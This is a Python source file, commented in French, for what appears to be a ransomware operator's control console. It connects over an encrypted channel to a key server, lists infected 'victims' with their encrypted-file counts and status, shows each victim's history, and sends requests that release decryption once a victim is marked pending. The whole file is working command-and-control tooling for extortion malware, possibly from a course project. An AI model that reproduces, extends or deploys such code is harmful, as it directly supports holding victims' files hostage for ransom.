from datetime import datetime
import utile.network as network
import utile.message as message
from art.ascii_art import menu_header, menu_options
import utile.config as config

# Constantes
config.load_config("config/console_controle.cfg", "config/console_controle_key.bin")
IP_SERV_CLES = config.get_config("IP_SERV_CLES")
PORT_SERV_CLES = config.get_config("PORT_SERV_CLES")
CONN_RETRY_SERV_CLES = config.get_config("CONN_RETRY_SERV_CLES")


MENU = menu_options

liste_victime = None

def listing_victimes(connexion):

    global cle_AES_GCM


    requete = message.set_message('LIST_VICTIM_REQ')
    network.send_with_aes(connexion, requete, cle_AES_GCM)


    reponse = None
    victimes = []
    while reponse != {'LIST_END': None}:
        reponse = network.receive_with_aes(connexion,cle_AES_GCM)
        victimes.append(reponse) if reponse != {'LIST_END': None} else None

    return victimes

def affichage_victime(victimes):
    print(f"{'N°':<7} {'Hash':<66} {'Type':<12} {'Disques':<16} {'Statut':<10} {'Nb. de fichiers':<25}")
    print('-' * 134)
    for i, victime in enumerate(victimes, start=1):
        print(f"{i:<7} {victime['HASH']:<66} {victime['OS']:<12} {victime['DISKS']:<16} {victime['STATE']:<10} "
              f"{victime['NB_FILES']:<25}")
        print('-' * 134)

    print('\nFin de la liste.')

def actio_victimes(connexion):

    global liste_victime

    liste_victime = listing_victimes(connexion)
    affichage_victime(liste_victime)


def demander_num_victim(change_state=False):
    while True:
        try:
            indice = int(input(f"Entrez le numéro de la victime (1 à {len(liste_victime)}) "))
            if 1 <= indice <= len(liste_victime):
                victime = liste_victime[indice - 1]

                if not change_state:
                    return victime['HASH']

                if change_state and victime['STATE']=='PENDING':
                    return victime['HASH']

                elif change_state and not victime['STATE']=='PENDING':
                    print(f"ERREUR : La victime {victime['HASH']} est en mode {victime['STATE']} !")
            else:
                print(f"Mauvaise saisie ! Veuillez rentrer un nombre entre 1 et {len(liste_victime)}.")
        except ValueError:
            print(f"Mauvaise saisie ! Veuillez rentrer un nombre entre 1 et {len(liste_victime)}.")


def demande_historique(connexion):
    global liste_victime
    global cle_AES_GCM


    hash_victim = demander_num_victim()

    requete = message.set_message('HISTORY_REQ', (hash_victim,))
    network.send_with_aes(connexion, requete, cle_AES_GCM)
    print("\nAffichage de l'historique de la victime...\n")
    print(f"Historique de {hash_victim}")
    print('-' * 78)

    return hash_victim

def reception_historique(hash_victim, connexion):
    reponse = None
    historique_victime = []
    while reponse != {'HIST_END': hash_victim}:
        reponse = network.receive_with_aes(connexion, cle_AES_GCM)

        historique_victime.append(reponse) if reponse != {'HIST_END': hash_victim} else None

    return historique_victime

def affichage_historique(historique_victime):
    print(f"{'N°':<4} {'Date':<20}   {'Statut':<10}   {'Nb. de fichiers':<25}")
    print('-' * 78)
    for i, maj in enumerate(historique_victime, start=1):
        date_pour_les_gens_normaux = datetime.fromtimestamp(maj['TIMESTAMP'])
        adjectif_fichier = 'chiffrés' if maj['STATE'] == 'PENDING' else 'à déchiffrer' \
            if maj['STATE'] == 'DECRYPT' else ''
        print(f"{i:<4} {date_pour_les_gens_normaux.strftime('%d/%m/%Y %H:%M:%S'):<20}   {maj['STATE']:<10} "
              f"  {maj['NB_FILES']} fichier(s) {adjectif_fichier}")
    print("\nFin de l'historique")

def actio_historique(connexion):

    global liste_victime

    if not liste_victime:
        print("ERREUR : Veuillez d'abord lister les victimes!")
        return


    hash_victim = demande_historique(connexion)
    historique = reception_historique(hash_victim, connexion)
    affichage_historique(historique)


def change_state(connexion):

    global liste_victime
    global cle_AES_GCM

    if not liste_victime:
        print("ERREUR : Veuillez d'abord lister les victimes!")
        return

    hash_victim = demander_num_victim(True)

    while True:
        validation = input(f"Confirmez la demande de déchiffrement pour la victime"
                           f" {hash_victim} (O/N): ")
        if validation.upper() == 'O' or validation.upper() == 'N':
            validation = True if validation.upper() == 'O' else False
            break
        else:
            print("Fais un effort, tape juste sur le 'O' ou 'N'.")


    if validation:
        params = (hash_victim, 'DECRYPT')
        requete = message.set_message('CHANGE_STATE', params)
        network.send_with_aes(connexion, requete, cle_AES_GCM)
        print("La demande a été transmise")
    else:
        print("Fin de l'interaction.")

def quitter_programme(connexion):
    print("Fermeture de la connexion...")
    connexion.close()
    exit()

def main():
    global liste_victime
    global cle_AES_GCM
    connexion_oserveur = network.connect_to_serv(ip=IP_SERV_CLES,port=PORT_SERV_CLES)
    cle_AES_GCM = network.diffie_hellman_recv_key(connexion_oserveur)

    dico_fonctions = {
        1: actio_victimes,
        2: actio_historique,
        3: change_state,
        4: quitter_programme,
    }

    try:
        print(menu_header)
        while True:
            try:
                print(MENU)
                choix = int(input('Votre choix : '))
                fonction_a_executer = dico_fonctions.get(choix)

                if fonction_a_executer:
                    fonction_a_executer(connexion_oserveur)
                else:
                    print("Choix invalide, veuillez réessayer.")
            except ValueError:
                print("Veuillez entrer un nombre valide.")



    except Exception as e:
        print(f"Erreur : {e}")

    finally:
        connexion_oserveur.close()  # Assure que la connexion est bien fermée
        print("Connexion fermée.")



if __name__ == '__main__':
    main()
